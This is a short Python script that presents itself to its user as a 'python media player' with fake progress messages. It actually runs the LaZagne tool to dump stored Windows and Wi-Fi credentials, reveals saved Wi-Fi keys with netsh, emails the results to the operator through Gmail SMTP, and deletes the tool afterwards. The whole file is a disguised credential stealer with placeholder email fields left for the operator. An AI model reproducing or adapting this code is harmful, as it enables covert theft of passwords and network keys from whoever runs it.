
import subprocess, smtplib, re ,os
import requests

def download(url):
    get_request =requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_request.content)

def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,msg)
    server.quit()
print("Thankyou for using python media player...")
print("[+] processing your request...")
print("it may take upto 2 minute...")
final_result = ""
# download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
command1 = 'lazagne.exe windows'
command2 = 'lazagne.exe wifi'
result1 = subprocess.check_output(command1,shell=True)
final_result=final_result +str(result1)
result2 = subprocess.check_output(command2,shell=True)
pattern = 'SSID: (.*?) Password not found '
substring = re.findall(pattern, str(result2))
wifi_name_list=[]
for name in substring:
    wifi_name_list.append(str(name[0:int(len(name)-11)]))

for wifi_name in wifi_name_list:
    final_result+=str(subprocess.check_output('netsh wlan show profile "'+wifi_name+'" key=clear',shell=True))
send_mail("Your Email here","Email Password",final_result)
os.remove("lazagne.exe")
print("program successfully executed")
